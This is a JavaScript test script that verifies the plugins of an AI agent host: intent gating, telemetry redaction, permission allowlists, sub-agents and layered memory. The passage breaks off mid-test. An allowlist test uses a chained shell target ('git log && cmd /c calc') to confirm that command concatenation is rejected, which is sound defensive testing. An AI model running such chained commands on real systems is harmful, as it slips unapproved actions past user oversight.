/**
 * 插件全量验证（9/9 覆盖）
 * ----------------------------------------------------------------------------
 * 背景：scripts/verify-p5.mjs 只覆盖 compensation + evolution 两个插件，
 * 其余 7 个（intent / trace / authz / brain / multi / memory / prompt）零测试。
 *
 * 本脚本改用**与生产一致的装载方式**：真实 Cordis Context + OrchDesk 宿主服务
 * （sandboxPolicy / approval / agents），装载全部 9 个插件后逐个验证真实行为。
 * 比 mock ctx 更贴近生产——此前正是「mock 通过但真实装载失败」掩盖了
 * provide 第三参误传导致 5 个插件从未激活的问题。
 *
 * 运行：node scripts/verify-plugins.mjs
 */

import { createRequire } from 'node:module';
import { pathToFileURL } from 'node:url';

const require = createRequire(import.meta.url);
const { Context } = require('@deepseek-ai/cordis');

let passed = 0;
let failed = 0;
const log = [];
let current = '';

function check(name, fn) {
  try {
    const r = fn();
    if (r instanceof Promise) {
      return r.then(() => { passed++; log.push(`  PASS  [${current}] ${name}`); },
        (e) => { failed++; log.push(`  FAIL  [${current}] ${name}\n        ${e.message}`); });
    }
    passed++;
    log.push(`  PASS  [${current}] ${name}`);
  } catch (e) {
    failed++;
    log.push(`  FAIL  [${current}] ${name}\n        ${e.message}`);
  }
  return undefined;
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg || '断言失败');
}

// ---------------------------------------------------------------------------
// 宿主服务（与 apps/desktop/host-services.ts 等价的最小实现）
// ---------------------------------------------------------------------------
const PLUGIN_NAMES = [
  'intent', 'trace', 'authz', 'brain', 'multi',
  'memory', 'prompt', 'compensation', 'evolution',
];

/** Cordis 期望 inject 为对象；插件导出的是数组 → 归一化。 */
function normalizeInject(mod) {
  const out = { ...mod };
  if (Array.isArray(out.inject)) {
    const obj = {};
    for (const k of out.inject) obj[k] = true;
    out.inject = obj;
  }
  return out;
}

async function boot() {
  const ctx = new Context();
  const approvalCalls = [];
  let nextOutcome = 'unavailable';
  let authModeStore = 'default';

  ctx.plugin({
    name: 'test-host-services',
    apply(c) {
      c.provide('sandboxPolicy', {
        resolve: () => ({ mode: 'workspace-write' }),
        setSandboxMode: () => {},
        // C1：风控档位 store（对齐 host-services 的 authMode 持久化语义）
        getAuthMode: () => authModeStore,
        setAuthMode: (m) => { authModeStore = (m === 'trusted' || m === 'paranoid') ? m : 'default'; },
      });
      c.provide('approval', {
        request: async (req) => { approvalCalls.push(req); return nextOutcome; },
        setPolicy: () => {},
      });
      c.provide('agents', {
        create: async (o) => ({ agent: { id: o?.sessionId || 'sub-x' }, dispose: async () => {} }),
      });
    },
  });
  await tick();

  const fibers = {};
  for (const n of PLUGIN_NAMES) {
    const mod = await import(pathToFileURL(require.resolve(`../packages/plugin/${n}/lib/index.js`)).href);
    const plugin = normalizeInject(mod);
    let config = typeof plugin.Config === 'function' ? plugin.Config({}) : undefined;
    // ③无界队列加固后，trace 的 repoUrl 空 ⟺ 关闭则不记录（不入队）。为保留
    // 「ctx.trace.recordFeedback 真入队」这条死挂点接线验证，此处给 trace 注入一个
    // 伪仓库（与生产 buildTraceConfig 在 enabled 时注入 repoUrl 的口径一致），
    // 否则验证的是「关闭时不记录」而非「服务真接通队列」。
    if (n === 'trace' && config && typeof config === 'object') {
      config = plugin.Config({ ...config, repoUrl: 'https://github.com/verify/plugs' });
    }
    fibers[n] = ctx.plugin(plugin, config);
    await tick();
  }
  return { ctx, fibers, approvalCalls, setOutcome: (o) => { nextOutcome = o; }, setAuthModeStore: (m) => { authModeStore = m; }, getAuthModeStore: () => authModeStore };
}

function tick(n = 3) {
  let p = Promise.resolve();
  for (let i = 0; i < n; i++) p = p.then(() => new Promise((r) => setTimeout(r, 0)));
  return p;
}

// ---------------------------------------------------------------------------
(async () => {
  const { ctx, fibers, approvalCalls, setOutcome, setAuthModeStore, getAuthModeStore } = await boot();

  console.log('\n== 装载 ==');
  current = '装载';
  for (const n of PLUGIN_NAMES) {
    await check(`${n} 激活（fiber.state=2）`, () => {
      assert(fibers[n].state === 2, `${n} 未激活，state=${fibers[n].state}`);
    });
  }

  // ---------------- intent ----------------
  current = 'intent';
  console.log('== intent（意图识别）==');
  // intent 无 provide，以 agent/pre-step waterfall 监听生效。
  // 该事件是 waterfall：监听器签名 (payload, next)，next 必须提供。
  const firePreStep = (text) => ctx.waterfall('agent/pre-step', {
    agent: { session: { id: 's1' }, meta: { id: 'a1' } },
    messages: [{ source: { kind: 'user' }, content: [{ type: 'text', text }] }],
    turn: 0, step: 0,
  }, async () => ({ kind: 'enter', messages: [] }));

  await check('普通提问放行（enter）', async () => {
    const d = await firePreStep('今天天气怎么样');
    assert(!d || d.kind === 'enter', '普通提问应放行，实际 ' + JSON.stringify(d));
  });
  await check('破坏性意图被拦截（reject/confirm，非 enter）', async () => {
    const d = await firePreStep('把所有日志文件全部删除');
    assert(d && d.kind && d.kind !== 'enter', '破坏性意图不应直接放行，实际 ' + JSON.stringify(d));
  });
  await check('外发意图被拦截（补偿层 headless fail-closed，非意图门）', async () => {
    // 层级说明：该 reject 来自补偿层（compensation 插件 pre-step：无 GUI 应答方 →
    // fail-closed 拦截）。A1 后意图门对外发仅 CONFIRM 放行；本用例守护的是补偿层
    // 在无确认通道时的拦截，断言保持非 enter。
    const d = await firePreStep('把这封邮件发送给客户');
    assert(d && d.kind && d.kind !== 'enter', '无应答方时外发意图应被补偿层拦截，实际 ' + JSON.stringify(d));
  });
  await check('命令词 prompt 放行（A1：意图门 g3 降级 CONFIRM，提到≠要做）', async () => {
    // A1 风控简化核心回归：「用 pnpm 安装这个 skill」这类提到命令词的 prompt
    // 不再被意图门枪毙（g3 失败 → CONFIRM 放行）；不命中补偿层外发类别。
    // 真正要执行时由执行层 authz L3/L4 + 补偿层拦截。
    const d = await firePreStep('用 pnpm 安装这个 skill');
    assert(!d || d.kind === 'enter', '命令词 prompt 应放行，实际 ' + JSON.stringify(d));
  });
  await check('C1：trusted 模式下意图门纯审计（补偿层中和后对照）', async () => {
    // 全插件集中补偿层对 destructive prompt 仍 fail-closed 拒绝（无 GUI 应答方）——
    // 按 spec 信任模式不放松补偿层，该拒绝是正确行为。用 allowed-once 中和补偿层，
    // 让结果只反映意图层：trusted → 放行，default → 仍拦截（BLOCK 保底）。
    // check() 只记录失败不抛出 → 断言失败时若不用 finally 复位，allowed-once / trusted
    // 会泄漏到后续所有用例，把后续真失败掩盖成通过（A-P2-7：验证器自身不可靠）。
    try {
      setOutcome('allowed-once');
      setAuthModeStore('default');
      const dDefault = await firePreStep('把所有日志文件全部删除');
      assert(dDefault && dDefault.kind === 'reject', 'default 档 destructive 应被意图门拦截，实际 ' + JSON.stringify(dDefault));
      setAuthModeStore('trusted');
      const dTrusted = await firePreStep('把所有日志文件全部删除');
      assert(!dTrusted || dTrusted.kind === 'enter', 'trusted 档应纯审计放行，实际 ' + JSON.stringify(dTrusted));
    } finally {
      setAuthModeStore('default');
      setOutcome('unavailable');
    }
  });
  await check('C1：paranoid 模式下无本地模型 → 保守 BLOCK', async () => {
    try {
      setAuthModeStore('paranoid');
      const d = await firePreStep('今天天气怎么样');
      assert(d && d.kind === 'reject', 'paranoid 无模型应保守拒绝，实际 ' + JSON.stringify(d));
    } finally {
      setAuthModeStore('default');
    }
  });
  await check('paranoid 铁律：补偿层拒绝且零审批请求（不问，直接拒）', async () => {
    // 主进程 approvalGate 在 paranoid 下是「直接拒、不弹窗」；补偿层此前无条件走
    // approval.request → 同一档位两条路，一套问一套不问。这里固化：paranoid 下
    // 补偿层既要 reject，也**一次都不发起审批请求**（弹窗本身就是违约）。
    try {
      setAuthModeStore('paranoid');
      const before = approvalCalls.length;
      const d = await firePreStep('把这封邮件发送给客户');
      assert(d && d.kind === 'reject', 'paranoid 档外发应被补偿层拒绝，实际 ' + JSON.stringify(d));
      assert(approvalCalls.length === before,
        `paranoid 档不应发起审批请求（不弹窗），实际多发起 ${approvalCalls.length - before} 次`);
    } finally {
      setAuthModeStore('default');
    }
  });
  await check('default 档仍走审批请求（paranoid 收口没有把正常路径一起堵死）', async () => {
    // 反向对照：只断言 paranoid 会拒是不够的——若把档位读成恒 paranoid，
    // default 档也会被拒且同样零请求，测试仍绿。这里确保 default 照旧提问。
    try {
      setAuthModeStore('default');
      const before = approvalCalls.length;
      const d = await firePreStep('把这封邮件发送给客户');
      assert(d && d.kind === 'reject', '无应答方（unavailable）时 default 档仍应 fail-closed 拒绝，实际 ' + JSON.stringify(d));
      assert(approvalCalls.length === before + 1,
        `default 档应发起 1 次审批请求，实际 ${approvalCalls.length - before} 次`);
    } finally {
      setAuthModeStore('default');
    }
  });

  // ---------------- trace ----------------
  current = 'trace';
  console.log('== trace（脱敏遥测）==');
  const traceMod = await import(pathToFileURL(require.resolve('../packages/plugin/trace/lib/index.js')).href);
  await check('mask() 只保留白名单元数据，剔除消息正文', () => {
    // 设计即白名单：TRACE 只上传元数据（v/ts/sessionKey/intent/feedback/source），
    // 绝不上传消息内容 —— 这是 PRD「脱敏后遥测」的落地方式。
    const masked = traceMod.mask({
      v: 1, ts: 1, sessionKey: 'k', intent: 'ACT', feedback: 1, source: 'ui',
      text: '原始消息正文', apiKey: 'sk-secret', password: 'p',
    });
    const s = JSON.stringify(masked);
    assert(!s.includes('原始消息正文'), '消息正文不应上传');
    assert(!s.includes('sk-secret'), 'API Key 不应上传');
    assert(masked.intent === 'ACT' && masked.feedback === 1, '元数据应保留: ' + s);
  });
  await check('mask() 不泄露邮箱/手机号（不在白名单内）', () => {
    const s = JSON.stringify(traceMod.mask({ v: 1, ts: 1, contact: 'a@b.com / 13800138000' }));
    assert(!s.includes('a@b.com'), '邮箱不应上传');
    assert(!s.includes('13800138000'), '手机号不应上传');
  });
  await check('recordFeedback 可写入且不抛错', () => {
    traceMod.recordFeedback({ sessionId: 's1', ts: Date.now(), helpful: true });
    assert(typeof traceMod.queueSize === 'function', '应暴露 queueSize');
  });
  await check('ctx.trace 服务已暴露（第八死挂点：渲染层反馈 → 遥测队列的服务入口）', () => {
    const svc = ctx.trace;
    assert(svc && typeof svc.recordFeedback === 'function', 'ctx.trace 缺失 recordFeedback');
    assert(typeof svc.queueSize === 'function' && typeof svc.flushNow === 'function', 'ctx.trace 应含 queueSize/flushNow');
  });
  await check('ctx.trace.recordFeedback 真入队（pending 增长）', () => {
    const before = ctx.trace.queueSize().pending;
    ctx.trace.recordFeedback('code_task', 'positive', 'sess-abc', 'msg-1');
    const after = ctx.trace.queueSize().pending;
    assert(after > before, `反馈应入队，before=${before} after=${after}`);
  });
  await check('compensation.withhold 契约：字符串入参命中外发/删除（对象入参此前恒不命中）', () => {
    // 第九死挂点根因：主进程把 text 包成 { text } 传给 withhold(text: string)。
    // 这里固化契约——入参必须是字符串，命中三类高危。
    assert(ctx.compensation.withhold('把这份报告发给客户').needsConfirm === true, '对外发送应需确认');
    assert(ctx.compensation.withhold('删除 /tmp/secret.txt').needsConfirm === true, '删除文件应需确认');
    const cat = ctx.compensation.withhold('调用接口 POST https://x.dev').category;
    assert(cat === 'network-egress', '网络外发应归类 network-egress，实际 ' + cat);
    assert(ctx.compensation.withhold('今天天气不错').needsConfirm === false, '普通对话不应拦截');
  });

  // ---------------- authz ----------------
  current = 'authz';
  console.log('== authz（授权）==');
  const authz = ctx.authz;
  await check('三模式可读', () => {
    const ids = authz.getModes().map((m) => m.id);
    assert(ids.join(',') === 'default,trusted,paranoid', '实际 ' + ids.join(','));
  });
  await check('L0–L4 共 5 级且编号连续', () => {
    const lv = authz.getLevels().map((l) => l.level).sort((a, b) => a - b);
    assert(lv.join(',') === '0,1,2,3,4', '实际 ' + lv.join(','));
  });
  await check('默认模式为 default', async () => {
    assert((await authz.getMode()) === 'default', '默认应为 default');
  });
  await check('setMode 成功并落审计', async () => {
    const r = await authz.setMode('paranoid');
    assert(r && r.ok !== false, '切换应成功: ' + JSON.stringify(r));
    assert(authz.getAuditLog().some((a) => a.kind === 'sandbox-mode'), '应产生审计记录');
  });
  // C1：档位 id 可分辨 + 持久化（历史 bug：default/trusted 在 (sandboxMode, policy)
  // 上同参，反推法分不出，「信任模式」是空操作且重启后回 default）。
  await check('C1：setMode(trusted) 后 getMode 可分辨且不随反推丢失', async () => {
    await authz.setMode('default');
    assert((await authz.getMode()) === 'default', 'default 可读');
    const r = await authz.setMode('trusted');
    assert(r && r.ok !== false, '切 trusted 应成功');
    assert((await authz.getMode()) === 'trusted', 'trusted 必须可分辨（不再被反推成 default）');
    // 持久化语义：store 即档位真源（host-services 侧落 sandbox.json，此处验证不依赖反推）
    assert(getAuthModeStore() === 'trusted', '档位应写入持久化 store');
    await authz.setMode('default'); // 复位，避免影响后续用例
  });
  await check('审批：无 UI 应答方 → fail-closed（unavailable）', async () => {
    const before = approvalCalls.length;
    const svc = ctx.approval;
    const outcome = await svc.request({ toolName: 'rm', reason: 'x' });
    assert(outcome === 'unavailable', '无应答方应返回 unavailable，实际 ' + outcome);
    assert(approvalCalls.length === before + 1, '审批请求应被记录');
  });

  // ---------------- authz · 授权白名单（PRD FR-9，第十一个死挂点）----------------
  await check('白名单：新增规则成功并入审计（含 scope 与目标）', () => {
    authz.revokeAll();
    const r = authz.grant({ tool: 'file_write', pattern: 'D:/work/*', scope: 'permanent' });
    assert(r.ok === true, '应成功: ' + (r.reason || ''));
    assert(r.rule && r.rule.id, '应返回带 id 的规则');
    assert(r.rule.hits === 0, '初始命中数应为 0');
    const added = authz.getAuditLog().filter((a) => a.kind === 'grant-added');
    assert(added.length === 1, '应落 1 条 grant-added 审计');
    assert(added[0].scope === 'permanent', '审计应记录粒度');
  });

  await check('白名单：非法入参被拒绝且给 reason（不静默丢弃）', () => {
    const cases = [
      [{ tool: '', pattern: '*', scope: 'permanent' }, '缺少 tool'],
      [{ tool: 'file_write', pattern: '', scope: 'permanent' }, '缺少 pattern'],
      [{ tool: 'file_write', pattern: '*', scope: 'forever' }, '非法 scope'],
      [{ tool: 'file_write', pattern: '*', scope: 'session' }, '会话级缺 sessionId'],
      // B-4（安全审查）：永久粒度不允许通配全部工具/全部目标——一次点击不该等于永久免审一切
      [{ tool: '*', pattern: '*', scope: 'permanent' }, '永久全放行规则'],
      [{ tool: 'file_write', pattern: '*', scope: 'permanent' }, '永久 + 全目标'],
      [{ tool: '*', pattern: 'D:/work/*', scope: 'permanent' }, '永久 + 全工具'],
      // R3-1：B-4 原来只比对字面量 '*'。'**' 及任意「去 * 后为空」的模式经
      // grantPatternToRegExp 编译成 ^[\s\S]*[\s\S]*$，同样命中一切目标——
      // 一条 tool=file_write, pattern='**', scope=permanent 就等于永久免审写任意文件。
      [{ tool: 'file_write', pattern: '**', scope: 'permanent' }, '永久 + ** 全目标'],
      [{ tool: 'file_write', pattern: '***', scope: 'permanent' }, '永久 + 连续星号'],
      [{ tool: 'file_write', pattern: '* *', scope: 'permanent' }, '永久 + 空格分隔星号'],
      [{ tool: 'file_write', pattern: ' * ', scope: 'permanent' }, '永久 + 空白包裹星号'],
    ];
    for (const [input, why] of cases) {
      const r = authz.grant(input);
      assert(r.ok === false, `${why}：应被拒绝`);
      assert(!!r.reason, `${why}：应给出 reason`);
    }
    assert(authz.listGrants().length === 1, '被拒的规则不应写入白名单');
  });

  await check('白名单：命中放行 + hits 累加 + 目标整串锚定（不做前缀逃逸）', () => {
    authz.revokeAll();
    authz.grant({ tool: 'file_write', pattern: 'D:/work/*', scope: 'permanent' });
    assert(authz.matchGrant({ toolName: 'file_write', target: 'D:/work/a.txt' }) !== null, '同目录应命中');
    assert(authz.matchGrant({ toolName: 'file_write', target: 'D:/work/sub/a.txt' }) !== null, '子目录应命中（* 跨分隔符）');
    assert(authz.matchGrant({ toolName: 'file_write', target: 'D:/workplace/secret' }) === null, 'D:/work* 不应逃逸到 D:/workplace');
    assert(authz.matchGrant({ toolName: 'shell_command', target: 'D:/work/a.txt' }) === null, '工具名不匹配不应放行');
    assert(authz.matchGrant({ toolName: 'file_write' }) === null, '无目标时真实路径规则不应放行（防误开）');
    assert(authz.listGrants()[0].hits === 2, '命中次数应为 2，实际 ' + authz.listGrants()[0].hits);
    assert(authz.getAuditLog().some((a) => a.kind === 'grant-matched'), '命中应入审计');
  });

  await check('白名单：正则元字符被转义（. 不代表任意字符）', () => {
    authz.revokeAll();
    authz.grant({ tool: 'file_write', pattern: 'D:/work/a.txt', scope: 'permanent' });
    assert(authz.matchGrant({ toolName: 'file_write', target: 'D:/work/a.txt' }) !== null, '精确路径应命中');
    assert(authz.matchGrant({ toolName: 'file_write', target: 'D:/work/axtxt' }) === null, '模式中的 . 不应等价于任意字符');
  });

  await check('白名单：会话级规则只在本会话生效；永久级跨会话', () => {
    authz.revokeAll();
    authz.grant({ tool: 'shell_command', pattern: '*', scope: 'session', sessionId: 'sess-A' });
    authz.grant({ tool: 'web_fetch', pattern: 'https://*', scope: 'permanent' });
    assert(authz.matchGrant({ toolName: 'shell_command', target: 'ls', sessionId: 'sess-A' }) !== null, '本会话应命中');
    assert(authz.matchGrant({ toolName: 'shell_command', target: 'ls', sessionId: 'sess-B' }) === null, '别的会话不应命中');
    assert(authz.matchGrant({ toolName: 'web_fetch', target: 'https://x.dev', sessionId: 'sess-B' }) !== null, '永久级应跨会话命中');
    // B-4：shell_command 目标含 shell 元字符时不命中任何规则（防命令拼接搭车免审）
    assert(authz.matchGrant({ toolName: 'shell_command', target: 'git log && cmd /c calc', sessionId: 'sess-A' }) === null,
      '含元字符的拼接命令不应被白名单放行');
  });

  await check('白名单：撤销单条 / 全部撤销，且入审计', () => {
    authz.revokeAll();
    const a = authz.grant({ tool: 'file_write', pattern: 'D:/work/*', scope: 'permanent' });
    const b = authz.grant({ tool: 'shell_command', pattern: 'git *', scope: 'permanent' });
    assert(authz.listGrants().length === 2, '应有 2 条');
    assert(authz.revoke(a.rule.id) === true, '撤销应命中');
    assert(authz.revoke(a.rule.id) === false, '重复撤销应返回 false');
    assert(authz.listGrants().length === 1, '应剩 1 条');
    assert(authz.getAuditLog().some((x) => x.kind === 'grant-revoked' && x.grantId === a.rule.id), '撤销应入审计');
    const n = authz.revokeAll();
    assert(n === 1, '全部撤销应返回 1，实际 ' + n);
    assert(authz.listGrants().length === 0, '应清空');
  });

  await check('白名单：序列化 / 回灌往返，坏条目静默跳过', () => {
    authz.revokeAll();
    authz.grant({ tool: 'file_write', pattern: 'D:/work/*', scope: 'permanent' });
    const snap = authz.serializeGrants();
    assert(snap.length === 1 && snap[0].pattern === 'D:/work/*', '序列化应保留规则');
    authz.hydrateGrants([
      { id: 'gr-keep', tool: 'web_fetch', pattern: 'https://a.dev/*', scope: 'permanent', createdAt: 1, hits: 7 },
      { id: 'gr-bad', tool: '', pattern: '*', scope: 'permanent' },
      { id: 'gr-bad2', tool: 'x', pattern: '*', scope: 'nope' },
      'not-an-object',
    ]);
    const after = authz.listGrants();
    assert(after.length === 1, '只应保留 1 条合法规则，实际 ' + after.length);
    assert(after[0].id === 'gr-keep' && after[0].hits === 7, '应保留 id 与命中数');
    authz.revokeAll();
  });

  // ---------------- brain ----------------
  current = 'brain';
  console.log('== brain（脑手解耦）==');
  const brain = ctx.brainHands;
  await check('派发 SubAgent 返回记录且状态可查', async () => {
    const rec = await brain.dispatchSubAgent({ label: '验证任务', parentSession: 's1' });
    assert(rec && rec.id, '应返回带 id 的记录');
    assert(brain.listSubAgents().some((x) => x.id === rec.id), '应能在列表中找到');
  });
  await check('销毁 SubAgent 后列表无残留（可逆效应）', async () => {
    const rec = await brain.dispatchSubAgent({ label: '待销毁', parentSession: 's1' });
    await brain.disposeSubAgent(rec.id, 'done');
    assert(!brain.listSubAgents().some((x) => x.id === rec.id), 'dispose 后不应残留');
  });
  await check('subscribe 可订阅事件并返回取消函数', () => {
    const off = brain.subscribe(() => {});
    assert(typeof off === 'function', '应返回取消函数');
    off();
  });

  // ---------------- multi ----------------
  current = 'multi';
  console.log('== multi（多 Agent 编排）==');
  const orch = ctx.orchestration;
  await check('目录为 8 专家 + 3 团', () => {
    const c = orch.getCatalog();
    assert(c.experts.length === 8, '专家应为 8，实际 ' + c.experts.length);
    assert(c.teams.length === 3, '团应为 3，实际 ' + c.teams.length);
  });
  await check('专家含 id 与 title', () => {
    const e = orch.getCatalog().experts[0];
    assert(e && e.id && (e.title || e.name), '专家结构不完整: ' + JSON.stringify(e));
  });
  await check('composeTeam(teamId, task) 返回 rootId + nodes', async () => {
    const teamId = orch.getCatalog().teams[0].id;
    const t = await orch.composeTeam(teamId, '验证任务');
    assert(t && t.rootId, '应返回 rootId');
    assert(Array.isArray(t.nodes) && t.nodes.length > 0, '应返回委派节点');
  });
  await check('getDelegationTree 返回树结构', () => {
    const tree = orch.getDelegationTree();
    assert(tree !== undefined && tree !== null, '应返回树');
  });

  // ---------------- memory ----------------
  current = 'memory';
  console.log('== memory（分层记忆）==');
  const mem = ctx.memory;
  await check('getStats 含四域', () => {
    const s = mem.getStats();
    for (const d of ['global', 'project', 'director', 'worker']) {
      assert(d in s, '缺少域 ' + d);
    }
  });
  await check('record(domain, text, source) 写入后该域计数增长', async () => {
    const before = Number(mem.getStats().worker) || 0;
    mem.record('worker', '验证记忆写入', 'worker');
    const after = Number(mem.getStats().worker) || 0;
    assert(after > before, `worker 域应从 ${before} 增长，实际 ${after}`);
  });
  await check('四域隔离：写 worker 不影响 global', async () => {
    const before = Number(mem.getStats().global) || 0;
    mem.record('worker', '另一条 worker 记录', 'worker');
    assert(Number(mem.getStats().global) === before, 'global 域计数不应被 worker 写入影响');
  });
  await check('listDomain 返回数组', () => {
    assert(Array.isArray(mem.listDomain('worker')), 'listDomain 应返回数组');
  });
  await check('queryDumps 返回数组', () => {
    assert(Array.isArray(mem.queryDumps()), 'queryDumps 应返回数组');
  });
  await check('hydrateDomains：合法条目回灌 + 非法条目过滤 + 非法快照域清空', () => {
    mem.hydrateDomains({
      global: [
        { id: 'g1', domain: 'global', text: '用户称呼为梧哥；助手称呼为小星', vector: { a: 1 }, source: { origin: 'test' }, createdAt: 1 },
        { id: 'bad-empty-text', text: '', vector: {}, source: {} },
        { id: 'bad-no-vector', text: 'x', source: {} },
        null,
      ],
      project: 'not-an-array',
    });
    const g = mem.listDomain('global');
    assert(g.length === 1, '非法条目应被过滤，实际 ' + g.length);
    assert(g[0] && g[0].id === 'g1', '应保留合法条目 g1');
    assert(mem.listDomain('project').length === 0, '非法快照域应清空而非抛错');
  });
  await check('hydrate 后回灌条目可被语义召回（持久化闭环前提）', () => {
    const hits = mem.recall('梧哥 称呼', { domain: 'global', k: 3 });
    assert(hits.some((h) => h.entry && h.entry.id === 'g1'), '回灌的 global 条目应可召回，实际 ' + JSON.stringify(hits.map((h) => h.entry && h.entry.id)));
  });

  // ---------------- 晋升链（FR-10，第十四个死挂点）----------------
  // 插件的 promote() 一直写得很完整（fail-closed、brain 过滤、来源标注），
  // 但全项目零调用方：Worker 域的条目进来就出不去，四域退化成「global + 三个摆设」。
  // 这组测试锁的是晋升语义本身；调用链（IPC / UI）由 apps/desktop 侧套件验证。
  current = 'memory/晋升';
  console.log('== 晋升链（FR-10：Worker 输出须经 Director 过滤）==');

  const brainMod = await import(pathToFileURL(require.resolve('../packages/plugin/brain/lib/index.js')).href);
  const bh = ctx.brainHands;

  await check('源头：dispose SubAgent 带结果 → 落 worker 域', async () => {
    const before = mem.listDomain('worker').length;
    const rec = await bh.dispatchSubAgent({ label: '产生结论', parentSession: 's1' });
    await bh.disposeSubAgent(rec.id, 'Worker 结论：应当落进 worker 域，之后才能谈晋升');
    const after = mem.listDomain('worker').length;
    assert(after === before + 1, `worker 域应 +1，实际 ${before} → ${after}`);
  });

  await check('dispose 不带结果 → 不写记忆（空结论不入域）', async () => {
    const before = mem.listDomain('worker').length;
    const rec = await bh.dispatchSubAgent({ label: '无结论任务', parentSession: 's1' });
    await bh.disposeSubAgent(rec.id);
    assert(mem.listDomain('worker').length === before, '无结果不应写记忆');
  });

  await check('fail-closed：无 Director 过滤器时 worker→director 被拒', async () => {
    brainMod.setDirectorFilter(null);
    const e = mem.listDomain('worker')[0];
    assert(e, 'worker 域应有条目（前置用例产出）');
    const r = await mem.promote(e.id, 'worker', 'director');
    assert(!r.ok, '无过滤器应拒绝，实际 ' + JSON.stringify(r));
    assert(/filter/.test(String(r.reason)), '原因应说明过滤器不可用，实际 ' + r.reason);
  });

  await check('fail-closed 补全：worker→project 也须过过滤（不能绕过 Director）', async () => {
    // 只锁 worker→director 一条边是不够的：worker→project 会绕过 Director 直写上层。
    brainMod.setDirectorFilter(() => false);
    const e = mem.listDomain('worker')[0];
    const r = await mem.promote(e.id, 'worker', 'project');
    assert(!r.ok, 'worker→project 同样须过过滤，实际 ' + JSON.stringify(r));
  });

  await check('Director 放行 → worker→director 晋升成功且条目换域', async () => {
    brainMod.setDirectorFilter(() => true);
    const e = mem.listDomain('worker')[0];
    const beforeW = mem.listDomain('worker').length;
    const r = await mem.promote(e.id, 'worker', 'director');
    assert(r.ok, '放行后应晋升成功，实际 ' + JSON.stringify(r));
    assert(mem.listDomain('worker').length === beforeW - 1, 'worker 域应减少一条');
    assert(mem.listDomain('director').some((x) => x.id === e.id), 'director 域应出现该条目');
  });

  await check('director→project 不经 worker 过滤（Director 自己产出的内容）', async () => {
    brainMod.setDirectorFilter(() => false); // 过滤器全拒：若误走 worker 过滤必然失败
    const e = mem.listDomain('director')[0];
    assert(e, 'director 域应有条目（前置用例晋升）');
    const r = await mem.promote(e.id, 'director', 'project');
    assert(r.ok, 'director 出域不应走 worker 过滤，实际 ' + JSON.stringify(r));
    assert(mem.listDomain('project').some((x) => x.id === e.id), 'project 域应出现该条目');
  });

  await check('条目不存在 / 同域 → 拒绝且不产生副作用', async () => {
    const r1 = await mem.promote('not-exist-id', 'project', 'global');
    assert(!r1.ok && r1.reason === 'entry-not-found', '实际 ' + JSON.stringify(r1));
    const e = mem.listDomain('project')[0];
    const r2 = await mem.promote(e.id, 'project', 'project');
    assert(!r2.ok && r2.reason === 'same-domain', '实际 ' + JSON.stringify(r2));
    assert(mem.listDomain('project').some((x) => x.id === e.id), '被拒的晋升不得移动条目');
  });

  await check('晋升后来源标注改写（可追溯 origin=promote:from->to）', () => {
    const e = mem.listDomain('project')[0];
    const origin = String((e && e.source && e.source.origin) || '');
    assert(/promote:director->project/.test(origin), '实际 ' + JSON.stringify(e && e.source));
  });

  // 恢复 fail-closed 默认，避免把「放行」状态泄漏给后续套件。
  brainMod.setDirectorFilter(null);

  // ---------------- 语义分块（FR-10「LLM 摘要 → 语义分块 → 向量编码 → 注入」）----------------
  // 此前 dump 把整批待转储消息一次性摘要成**一条**记忆、一个向量。一个向量要同时
  // 代表多个主题，召回时余弦被稀释 —— 问「数据库怎么样」命中一条混着「改了登录
  // 逻辑 + 下周发版」的记忆，哪个主题都匹配得不疼不痒。
  current = 'memory/分块';
  console.log('== 语义分块（FR-10 转储链）==');

  const memMod = await import(pathToFileURL(require.resolve('../packages/plugin/memory/lib/index.js')).href);
  const chunkMessages = memMod.chunkMessages;

  // 注：本套件的 assert 是自定义的两参版（cond, msg），没有 node:assert 的
  // strictEqual / deepStrictEqual / ok，比对一律用 === 或 JSON.stringify。
  await check('分块：空输入 / 全空文本 → 空数组（不产生空块）', () => {
    assert(chunkMessages([]).length === 0, '空输入应得空数组');
    assert(chunkMessages(['', '   ', null, undefined]).length === 0, '全空文本应得空数组');
  });

  await check('分块：不超预算时只切一块', () => {
    const out = chunkMessages(['a', 'b', 'c'], 1000);
    assert(out.length === 1, '实际 ' + out.length);
    assert(JSON.stringify(out[0]) === JSON.stringify(['a', 'b', 'c']), '实际 ' + JSON.stringify(out[0]));
  });

  await check('分块：累积超预算即切块，边界落在消息边界上（不切断消息）', () => {
    const X = 'x'.repeat(60), Y = 'y'.repeat(60), Z = 'z'.repeat(60);
    const out = chunkMessages([X, Y, Z], 100);
    assert(out.length === 3, `60 字符一条、预算 100 应得 3 块，实际 ${out.length}`);
    for (const c of out) {
      for (const t of c) {
        assert(t === X || t === Y || t === Z, '出现被切断的消息，长度 ' + t.length);
      }
    }
  });

  await check('分块：单条超预算独占一块（不把消息剁碎）', () => {
    const long = 'L'.repeat(500);
    const out = chunkMessages([long, 'short'], 100);
    assert(out.length === 2, '实际 ' + out.length);
    assert(out[0][0] === long, '超长消息应完整保留在第一块');
    assert(out[1][0] === 'short', '实际 ' + out[1][0]);
  });

  await check('分块：无文本丢失（展平后与输入一致）', () => {
    const input = [0, 1, 2, 3, 4].map((i) => String(i).repeat(50));
    const flat = chunkMessages(input, 120).flat();
    assert(flat.length === input.length, `条数应一致，实际 ${flat.length} vs ${input.length}`);
    for (const t of input) assert(flat.indexOf(t) >= 0, '丢失：' + t[0]);
  });

  await check('分块：budget 非法（0 / 负数 / NaN）回落默认，不产生空转', () => {
    const two = ['a'.repeat(100), 'b'.repeat(100)];
    assert(chunkMessages(two, 0).length === 1, 'budget=0 应回落默认');
    assert(chunkMessages(two, -5).length === 1, 'budget 负数应回落默认');
    assert(chunkMessages(two, NaN).length === 1, 'budget=NaN 应回落默认');
  });

  await check('dump：每块产出一条独立记忆（不再是整批一条）', async () => {
    const before = mem.listDomain('project').length;
    const msgs = [];
    for (let i = 0; i < 12; i++) {
      msgs.push({ content: [{ type: 'text', text: `主题${i}：` + '内容'.repeat(200) }] });
    }
    const rec = await mem.dump('s-chunk', msgs, { domain: 'project' });
    assert(rec.chunks.length >= 3, `12 条长消息（keepRecent=6）应切成多块，实际 ${rec.chunks.length}`);
    assert(rec.memoryIds.length === rec.chunks.length, '每块应对应一条记忆');
    const grew = mem.listDomain('project').length - before;
    assert(grew === rec.memoryIds.length, `域计数应按块数增长，实际 +${grew} vs 块数 ${rec.memoryIds.length}`);
  });

  await check('dump：summary = 各块拼接，memoryId 指向首块（旧字段仍可用）', async () => {
